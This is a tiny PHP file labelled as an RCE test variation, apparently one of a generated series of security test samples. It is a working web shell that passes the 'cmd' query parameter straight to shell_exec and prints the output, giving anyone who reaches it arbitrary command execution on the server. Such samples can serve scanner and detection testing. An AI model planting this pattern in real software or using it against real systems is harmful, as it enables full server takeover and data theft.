<?php
// RCE test variation #384
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>